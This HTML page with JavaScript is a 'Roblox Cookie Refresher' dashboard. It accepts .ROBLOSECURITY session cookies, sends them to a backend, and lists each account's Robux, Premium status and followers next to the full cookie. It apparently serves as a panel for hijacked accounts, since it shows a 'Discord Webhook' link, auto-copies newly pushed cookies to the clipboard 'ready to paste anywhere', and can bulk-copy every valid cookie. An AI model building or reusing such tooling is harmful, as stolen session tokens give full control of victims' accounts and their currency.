
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Refresher Tool</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(45deg, #00A2FF, #0078D4);
            color: white;
            padding: 30px;
            text-align: center;
            position: relative;
        }

        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        .header p {
            font-size: 1.1rem;
            opacity: 0.9;
        }

        .connection-status {
            position: absolute;
            top: 20px;
            right: 20px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #2ed573;
            animation: pulse 2s infinite;
        }

        .status-dot.disconnected {
            background: #ff4757;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.2); opacity: 0.7; }
            100% { transform: scale(1); opacity: 1; }
        }

        .notifications {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            max-width: 350px;
        }

        .notification {
            background: white;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            border-left: 4px solid #0078D4;
            animation: slideIn 0.3s ease-out;
        }

        .notification.success {
            border-left-color: #2ed573;
        }

        .notification.error {
            border-left-color: #ff4757;
        }

        .notification.warning {
            border-left-color: #ffa502;
        }

        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .add-cookie-section {
            padding: 30px;
            border-bottom: 1px solid #eee;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        .form-group input:focus {
            outline: none;
            border-color: #0078D4;
        }

        .btn {
            background: linear-gradient(45deg, #00A2FF, #0078D4);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            position: relative;
            overflow: hidden;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .btn-small {
            padding: 8px 16px;
            font-size: 14px;
        }

        .btn-danger {
            background: linear-gradient(45deg, #ff4757, #ff3742);
        }

        .btn-success {
            background: linear-gradient(45deg, #2ed573, #1e90ff);
        }

        .loading-spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0078D4;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .cookies-section {
            padding: 30px;
        }

        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .stats {
            display: flex;
            gap: 20px;
            font-size: 14px;
            color: #666;
        }

        .stat-item {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .cookies-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(450px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }

        .cookie-card {
            border: 2px solid #eee;
            border-radius: 12px;
            padding: 20px;
            background: #fafafa;
            transition: border-color 0.3s, transform 0.2s;
            position: relative;
        }

        .cookie-card:hover {
            border-color: #0078D4;
            transform: translateY(-2px);
        }

        .cookie-card.valid {
            border-color: #2ed573;
            background: #f0fff4;
        }

        .cookie-card.invalid {
            border-color: #ff4757;
            background: #fff5f5;
        }

        .cookie-card.loading {
            border-color: #ffa502;
            background: #fffbf0;
        }

        .cookie-card.new-cookie {
            animation: newCookieGlow 2s ease-in-out;
        }

        @keyframes newCookieGlow {
            0%, 100% { box-shadow: 0 0 0 rgba(0, 162, 255, 0); }
            50% { box-shadow: 0 0 20px rgba(0, 162, 255, 0.6); }
        }

        .cookie-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .cookie-username {
            font-size: 1.3rem;
            font-weight: 600;
            color: #333;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .premium-badge {
            background: linear-gradient(45deg, #ffd700, #ff8c00);
            color: white;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
        }

        .cookie-status {
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
        }

        .status-valid {
            background: #2ed573;
            color: white;
        }

        .status-invalid {
            background: #ff4757;
            color: white;
        }

        .status-loading {
            background: #ffa502;
            color: white;
        }

        .cookie-info {
            margin-bottom: 15px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            padding: 5px 0;
        }

        .info-label {
            font-weight: 600;
            color: #666;
        }

        .info-value {
            color: #333;
            text-align: right;
            max-width: 60%;
            word-wrap: break-word;
        }

        .cookie-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .status-indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            display: inline-block;
            margin-right: 8px;
        }

        .status-online {
            background: #2ed573;
            box-shadow: 0 0 10px rgba(46, 213, 115, 0.5);
        }

        .status-offline {
            background: #ff4757;
            box-shadow: 0 0 10px rgba(255, 71, 87, 0.5);
        }

        .status-loading-indicator {
            background: #ffa502;
            box-shadow: 0 0 10px rgba(255, 165, 2, 0.5);
        }

        .last-checked {
            font-size: 12px;
            color: #999;
            margin-top: 10px;
        }

        .copy-btn {
            background: linear-gradient(45deg, #28a745, #20c997);
            color: white;
            border: none;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            cursor: pointer;
            margin-left: 8px;
            transition: all 0.2s;
        }

        .copy-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 2px 8px rgba(40, 167, 69, 0.3);
        }

        .copy-btn.copied {
            background: linear-gradient(45deg, #17a2b8, #138496);
        }

        .copyable {
            cursor: pointer;
            position: relative;
            display: inline-flex;
            align-items: center;
            max-width: 100%;
        }

        .copyable:hover {
            background: rgba(0, 120, 212, 0.1);
            border-radius: 4px;
            padding: 2px;
        }

        .copy-success {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #2ed573;
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            font-weight: 600;
            z-index: 10000;
            animation: copySuccessAnimation 2s ease-in-out;
        }

        @keyframes copySuccessAnimation {
            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.5); }
            20% { opacity: 1; transform: translate(-50%, -50%) scale(1.1); }
            80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
            100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
        }

        .auto-copy-alert {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: linear-gradient(135deg, #00FF88, #00D4FF);
            color: white;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.4);
            z-index: 10001;
            animation: autoCopyAnimation 4s ease-in-out;
            text-align: center;
            min-width: 300px;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }

        .auto-copy-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
        }

        .auto-copy-icon {
            font-size: 2.5rem;
            animation: bounce 1s infinite;
        }

        .auto-copy-title {
            font-size: 1.2rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .auto-copy-subtitle {
            font-size: 1rem;
            opacity: 0.9;
            font-weight: 500;
        }

        .auto-copy-action {
            font-size: 0.9rem;
            opacity: 0.8;
            background: rgba(255, 255, 255, 0.2);
            padding: 5px 15px;
            border-radius: 20px;
            margin-top: 5px;
        }

        @keyframes autoCopyAnimation {
            0% { 
                opacity: 0; 
                transform: translateX(-50%) translateY(-30px) scale(0.8); 
            }
            15% { 
                opacity: 1; 
                transform: translateX(-50%) translateY(0) scale(1.1); 
            }
            85% { 
                opacity: 1; 
                transform: translateX(-50%) translateY(0) scale(1); 
            }
            100% { 
                opacity: 0; 
                transform: translateX(-50%) translateY(-20px) scale(0.9); 
            }
        }

        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
            60% { transform: translateY(-5px); }
        }

        .loading {
            text-align: center;
            padding: 20px;
            color: #666;
        }

        .alert {
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
        }

        .alert-success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
        }

        .alert-error {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
        }

        @media (max-width: 768px) {
            .cookies-grid {
                grid-template-columns: 1fr;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .container {
                margin: 10px;
            }
            
            .section-header {
                flex-direction: column;
                gap: 10px;
                align-items: flex-start;
            }
        }
    </style>
</head>
<body>
    <div class="notifications" id="notifications"></div>
    
    <div class="container">
        <div class="header">
            <div class="connection-status">
                <div class="status-dot" id="connectionDot"></div>
                <span id="connectionText">Connected</span>
                <div style="margin-left: 15px; display: flex; align-items: center; gap: 8px;">
                    <span style="font-size: 16px;">🔗</span>
                    <span style="font-size: 12px;">Discord Webhook</span>
                </div>
            </div>
            <h1>🍪 Roblox Cookie Refresher</h1>
            <p>Automatically monitor and refresh your Roblox account information in real-time</p>
        </div>

        <div class="add-cookie-section">
            <h2>Add New Cookie</h2>
            <div class="form-group">
                <label for="cookieInput">Roblox .ROBLOSECURITY Cookie:</label>
                <input type="password" id="cookieInput" placeholder="Enter your .ROBLOSECURITY cookie value here...">
            </div>
            <button class="btn" id="addBtn" onclick="addCookie()">Add Cookie</button>
        </div>

        <div class="cookies-section">
            <div class="section-header">
                <div>
                    <h2>Active Cookies (<span id="cookieCount">0</span>)</h2>
                    <div class="stats">
                        <div class="stat-item">
                            <span class="status-indicator status-online"></span>
                            <span>Valid: <span id="validCount">0</span></span>
                        </div>
                        <div class="stat-item">
                            <span class="status-indicator status-offline"></span>
                            <span>Invalid: <span id="invalidCount">0</span></span>
                        </div>
                        <div class="stat-item">
                            <span class="status-indicator status-loading-indicator"></span>
                            <span>Loading: <span id="loadingCount">0</span></span>
                        </div>
                    </div>
                </div>
                <div style="display: flex; gap: 10px;">
                    <button class="btn btn-small" onclick="copyAllCookiesInfo()" style="background: linear-gradient(45deg, #28a745, #20c997);">
                        📋 Copy All Info
                    </button>
                    <button class="btn btn-success btn-small" onclick="refreshAllCookies()">🔄 Refresh All</button>
                </div>
            </div>
            
            <div id="cookiesContainer" class="cookies-grid">
                <div class="loading">No cookies added yet. Add a cookie above to get started!</div>
            </div>
        </div>
    </div>

    <script>
        let ws;
        let cookies = [];
        let connectionStatus = false;

        // Initialize WebSocket connection
        function initWebSocket() {
            // Close existing connection if it exists
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.close();
            }
            
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            ws = new WebSocket(`${protocol}//${window.location.host}`);
            
            // Set a connection timeout
            const connectionTimeout = setTimeout(() => {
                if (ws.readyState === WebSocket.CONNECTING) {
                    ws.close();
                    console.log('WebSocket connection timeout');
                    connectionStatus = false;
                    updateConnectionStatus();
                    setTimeout(initWebSocket, 5000);
                }
            }, 10000);
            
            ws.onopen = function() {
                console.log('WebSocket connected');
                clearTimeout(connectionTimeout);
                connectionStatus = true;
                updateConnectionStatus();
                
                // Send a heartbeat every 25 seconds to keep connection alive
                if (window.heartbeatInterval) {
                    clearInterval(window.heartbeatInterval);
                }
                window.heartbeatInterval = setInterval(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({ type: 'ping' }));
                    }
                }, 25000);
            };
            
            ws.onmessage = function(event) {
                try {
                    const data = JSON.parse(event.data);
                    if (data.type !== 'pong') { // Ignore pong responses
                        handleWebSocketMessage(data);
                    }
                } catch (error) {
                    console.error('Error parsing WebSocket message:', error);
                }
            };
            
            ws.onclose = function(event) {
                console.log('WebSocket disconnected, attempting to reconnect...', event.code, event.reason);
                clearTimeout(connectionTimeout);
                if (window.heartbeatInterval) {
                    clearInterval(window.heartbeatInterval);
                }
                connectionStatus = false;
                updateConnectionStatus();
                
                // Exponential backoff for reconnection
                const retryDelay = Math.min(5000 + Math.random() * 5000, 30000);
                setTimeout(initWebSocket, retryDelay);
            };
            
            ws.onerror = function(error) {
                console.error('WebSocket error:', error);
                clearTimeout(connectionTimeout);
                connectionStatus = false;
                updateConnectionStatus();
            };
        }

        function updateConnectionStatus() {
            const dot = document.getElementById('connectionDot');
            const text = document.getElementById('connectionText');
            
            if (connectionStatus) {
                dot.classList.remove('disconnected');
                text.textContent = 'Connected';
            } else {
                dot.classList.add('disconnected');
                text.textContent = 'Disconnected';
            }
        }

        function showNotification(message, type = 'info', duration = 5000) {
            const container = document.getElementById('notifications');
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.textContent = message;
            
            container.appendChild(notification);
            
            setTimeout(() => {
                notification.remove();
            }, duration);
        }

        function handleWebSocketMessage(data) {
            switch(data.type) {
                case 'cookieList':
                    cookies = data.cookies;
                    renderCookies();
                    break;
                case 'cookieAdded':
                    cookies.push(data.cookie);
                    renderCookies();
                    // Highlight new cookie
                    setTimeout(() => {
                        const cookieCard = document.querySelector(`[data-cookie-id="${data.cookie.id}"]`);
                        if (cookieCard) {
                            cookieCard.classList.add('new-cookie');
                            setTimeout(() => {
                                cookieCard.classList.remove('new-cookie');
                            }, 2000);
                        }
                    }, 100);
                    break;
                case 'cookieUpdate':
                    const index = cookies.findIndex(c => c.id === data.cookie.id);
                    if (index !== -1) {
                        cookies[index] = data.cookie;
                        renderCookies();
                    }
                    break;
                case 'cookieRemoved':
                    cookies = cookies.filter(c => c.id !== data.cookieId);
                    renderCookies();
                    break;
                case 'notification':
                    showNotification(data.message, data.level);
                    break;
                case 'autoCopy':
                    // Auto-copy new cookie to clipboard
                    if (data.cookieData && data.cookieData.fullCookie) {
                        copyToClipboard(data.cookieData.fullCookie, 'New Cookie');
                        showNotification(data.message, 'success');
                        showAutoCardAnimation(data.cookieData.username);
                    }
                    break;
            }
        }

        async function addCookie() {
            const cookieInput = document.getElementById('cookieInput');
            const addBtn = document.getElementById('addBtn');
            const cookie = cookieInput.value.trim();
            
            if (!cookie) {
                showNotification('Please enter a cookie value', 'error');
                return;
            }
            
            addBtn.disabled = true;
            addBtn.innerHTML = '<div class="loading-spinner"></div>Adding...';
            
            try {
                const response = await fetch('/api/add-cookie', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ cookie })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    cookieInput.value = '';
                    showNotification('Cookie is being validated...', 'info');
                } else {
                    showNotification('Failed to add cookie: ' + result.error, 'error');
                }
            } catch (error) {
                showNotification('Error adding cookie: ' + error.message, 'error');
            } finally {
                addBtn.disabled = false;
                addBtn.innerHTML = 'Add Cookie';
            }
        }

        async function refreshCookie(cookieId) {
            try {
                const response = await fetch(`/api/refresh-cookie/${cookieId}`, {
                    method: 'POST'
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showNotification('Cookie refreshed successfully!', 'success');
                } else {
                    showNotification('Failed to refresh cookie', 'error');
                }
            } catch (error) {
                showNotification('Error refreshing cookie: ' + error.message, 'error');
            }
        }

        async function removeCookie(cookieId) {
            if (!confirm('Are you sure you want to remove this cookie?')) {
                return;
            }
            
            try {
                const response = await fetch(`/api/remove-cookie/${cookieId}`, {
                    method: 'DELETE'
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showNotification('Cookie removed successfully!', 'success');
                } else {
                    showNotification('Failed to remove cookie', 'error');
                }
            } catch (error) {
                showNotification('Error removing cookie: ' + error.message, 'error');
            }
        }

        async function refreshAllCookies() {
            showNotification('Refreshing all cookies...', 'info');
            for (const cookie of cookies) {
                await refreshCookie(cookie.id);
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        async function retryCookie(cookieId) {
            await refreshCookie(cookieId);
        }

        function renderCookies() {
            const container = document.getElementById('cookiesContainer');
            const countElement = document.getElementById('cookieCount');
            const validCountElement = document.getElementById('validCount');
            const invalidCountElement = document.getElementById('invalidCount');
            const loadingCountElement = document.getElementById('loadingCount');
            
            countElement.textContent = cookies.length;
            
            const validCookies = cookies.filter(c => c.isValid === true);
            const invalidCookies = cookies.filter(c => c.isValid === false);
            const loadingCookies = cookies.filter(c => c.isLoading === true || c.isValid === null);
            
            validCountElement.textContent = validCookies.length;
            invalidCountElement.textContent = invalidCookies.length;
            loadingCountElement.textContent = loadingCookies.length;
            
            if (cookies.length === 0) {
                container.innerHTML = '<div class="loading">No cookies added yet. Add a cookie above to get started!</div>';
                return;
            }
            
            container.innerHTML = cookies.map(cookie => `
                <div class="cookie-card ${cookie.isLoading ? 'loading' : (cookie.isValid ? 'valid' : 'invalid')}" data-cookie-id="${cookie.id}">
                    <div class="cookie-header">
                        <div>
                            <span class="status-indicator ${cookie.isLoading ? 'status-loading-indicator' : (cookie.isValid ? 'status-online' : 'status-offline')}"></span>
                            <span class="cookie-username ${cookie.isValid && !cookie.isLoading ? 'copyable' : ''}" ${cookie.isValid && !cookie.isLoading ? `onclick="copyToClipboard('${cookie.username}', 'Username')"` : ''}>
                                ${cookie.isLoading ? '<div class="loading-spinner"></div>' : ''}
                                ${cookie.username || (cookie.isValid ? 'Loading...' : 'Invalid Cookie')}
                                ${cookie.isPremium ? '<span class="premium-badge">Premium</span>' : ''}
                                ${cookie.isValid && !cookie.isLoading ? '<button class="copy-btn">📋</button>' : ''}
                            </span>
                        </div>
                        <span class="cookie-status ${cookie.isLoading ? 'status-loading' : (cookie.isValid ? 'status-valid' : 'status-invalid')}">
                            ${cookie.isLoading ? 'Loading' : (cookie.isValid ? 'Valid' : 'Invalid')}
                        </span>
                    </div>
                    
                    <div class="cookie-info">
                        ${cookie.isValid && !cookie.isLoading ? `
                            <div class="info-row">
                                <span class="info-label">User ID:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${cookie.userId || 'N/A'}', 'User ID')">${cookie.userId || 'N/A'}<button class="copy-btn">📋</button></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Display Name:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${cookie.displayName || 'N/A'}', 'Display Name')">${cookie.displayName || 'N/A'}<button class="copy-btn">📋</button></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Robux:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${cookie.robux || 0}', 'Robux Amount')">💰 ${cookie.robux || 0}<button class="copy-btn">📋</button></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Followers:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${cookie.followers || 0}', 'Followers Count')">👥 ${cookie.followers || 0}<button class="copy-btn">📋</button></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Following:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${cookie.following || 0}', 'Following Count')">➕ ${cookie.following || 0}<button class="copy-btn">📋</button></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Account Created:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${cookie.created ? new Date(cookie.created).toLocaleDateString() : 'N/A'}', 'Account Creation Date')">${cookie.created ? new Date(cookie.created).toLocaleDateString() : 'N/A'}<button class="copy-btn">📋</button></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Description:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${(cookie.description && cookie.description.trim()) || 'No description'}', 'Account Description')">${(cookie.description && cookie.description.trim()) || 'No description'}<button class="copy-btn">📋</button></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Cookie:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${cookie.fullCookie}', 'Full Cookie')">${cookie.cookie}<button class="copy-btn">📋</button></span>
                            </div>
                        ` : cookie.isLoading ? `
                            <div class="info-row">
                                <span class="info-label">Status:</span>
                                <span class="info-value">Fetching account information...</span>
                            </div>
                        ` : `
                            <div class="info-row">
                                <span class="info-label">Error:</span>
                                <span class="info-value">${cookie.error || 'Invalid cookie'}</span>
                            </div>
                        `}
                    </div>
                    
                    <div class="cookie-actions">
                        <button class="btn btn-success btn-small" onclick="refreshCookie('${cookie.id}')" ${cookie.isLoading ? 'disabled' : ''}>
                            🔄 Refresh
                        </button>
                        ${cookie.isValid && !cookie.isLoading ? `
                        <button class="btn btn-small" onclick="copyAllInfo('${cookie.id}')" style="background: linear-gradient(45deg, #28a745, #20c997);">
                            📋 Copy All
                        </button>
                        ` : ''}
                        ${!cookie.isValid && !cookie.isLoading ? `
                        <button class="btn btn-small" onclick="retryCookie('${cookie.id}')" style="background: linear-gradient(45deg, #ff9500, #ff6b00);">
                            🔁 Retry
                        </button>
                        ` : ''}
                        <button class="btn btn-danger btn-small" onclick="removeCookie('${cookie.id}')" ${cookie.isLoading ? 'disabled' : ''}>
                            🗑️ Remove
                        </button>
                    </div>
                    
                    <div class="last-checked">
                        ${cookie.addedAt ? `Added: ${new Date(cookie.addedAt).toLocaleString()} • ` : ''}
                        Last checked: ${new Date(cookie.lastChecked).toLocaleString()}
                    </div>
                </div>
            `).join('');
        }

        // Initialize when page loads
        document.addEventListener('DOMContentLoaded', function() {
            initWebSocket();
        });

        // Allow Enter key to submit cookie
        document.getElementById('cookieInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                addCookie();
            }
        });

        // Copy to clipboard functionality
        async function copyToClipboard(text, label = 'Text') {
            try {
                await navigator.clipboard.writeText(text);
                showCopySuccess(`${label} copied to clipboard!`);
                showNotification(`📋 ${label} copied to clipboard!`, 'success', 2000);
            } catch (err) {
                // Fallback for older browsers
                const textArea = document.createElement('textarea');
                textArea.value = text;
                textArea.style.position = 'fixed';
                textArea.style.left = '-999999px';
                textArea.style.top = '-999999px';
                document.body.appendChild(textArea);
                textArea.focus();
                textArea.select();
                
                try {
                    document.execCommand('copy');
                    showCopySuccess(`${label} copied to clipboard!`);
                    showNotification(`📋 ${label} copied to clipboard!`, 'success', 2000);
                } catch (fallbackErr) {
                    showNotification('Failed to copy to clipboard', 'error');
                }
                
                document.body.removeChild(textArea);
            }
        }

        function showCopySuccess(message) {
            const successDiv = document.createElement('div');
            successDiv.className = 'copy-success';
            successDiv.textContent = message;
            document.body.appendChild(successDiv);
            
            setTimeout(() => {
                document.body.removeChild(successDiv);
            }, 2000);
        }

        function showAutoCardAnimation(username) {
            const autoAlert = document.createElement('div');
            autoAlert.className = 'auto-copy-alert';
            autoAlert.innerHTML = `
                <div class="auto-copy-content">
                    <div class="auto-copy-icon">🍪✨</div>
                    <div class="auto-copy-title">AUTO-COPIED!</div>
                    <div class="auto-copy-subtitle">${username}'s cookie copied to clipboard</div>
                    <div class="auto-copy-action">Ready to paste anywhere! 📋</div>
                </div>
            `;
            document.body.appendChild(autoAlert);
            
            setTimeout(() => {
                if (document.body.contains(autoAlert)) {
                    document.body.removeChild(autoAlert);
                }
            }, 4000);
        }

        async function copyAllInfo(cookieId) {
            const cookie = cookies.find(c => c.id === cookieId);
            if (!cookie || !cookie.isValid) return;
            
            const allInfo = `
=== Roblox Account Information ===
Username: ${cookie.username || 'N/A'}
Display Name: ${cookie.displayName || 'N/A'}
User ID: ${cookie.userId || 'N/A'}
Robux: ${cookie.robux || 0}
Premium: ${cookie.isPremium ? 'Yes' : 'No'}
Followers: ${cookie.followers || 0}
Following: ${cookie.following || 0}
Account Created: ${cookie.created ? new Date(cookie.created).toLocaleDateString() : 'N/A'}
Description: ${(cookie.description && cookie.description.trim()) || 'No description'}
Cookie: ${cookie.fullCookie || 'N/A'}
Last Checked: ${new Date(cookie.lastChecked).toLocaleString()}
Added At: ${cookie.addedAt ? new Date(cookie.addedAt).toLocaleString() : 'N/A'}
            `.trim();
            
            await copyToClipboard(allInfo, 'All account information');
        }

        // Add bulk copy all cookies function
        async function copyAllCookiesInfo() {
            const validCookies = cookies.filter(c => c.isValid && !c.isLoading);
            if (validCookies.length === 0) {
                showNotification('No valid cookies to copy', 'warning');
                return;
            }
            
            let allCookiesInfo = '=== All Roblox Accounts Information ===\n\n';
            
            validCookies.forEach((cookie, index) => {
                allCookiesInfo += `--- Account ${index + 1} ---\n`;
                allCookiesInfo += `Username: ${cookie.username || 'N/A'}\n`;
                allCookiesInfo += `Display Name: ${cookie.displayName || 'N/A'}\n`;
                allCookiesInfo += `User ID: ${cookie.userId || 'N/A'}\n`;
                allCookiesInfo += `Robux: ${cookie.robux || 0}\n`;
                allCookiesInfo += `Premium: ${cookie.isPremium ? 'Yes' : 'No'}\n`;
                allCookiesInfo += `Followers: ${cookie.followers || 0}\n`;
                allCookiesInfo += `Following: ${cookie.following || 0}\n`;
                allCookiesInfo += `Cookie: ${cookie.fullCookie || 'N/A'}\n`;
                allCookiesInfo += `\n`;
            });
            
            await copyToClipboard(allCookiesInfo, `Information for ${validCookies.length} accounts`);
        }
    </script>
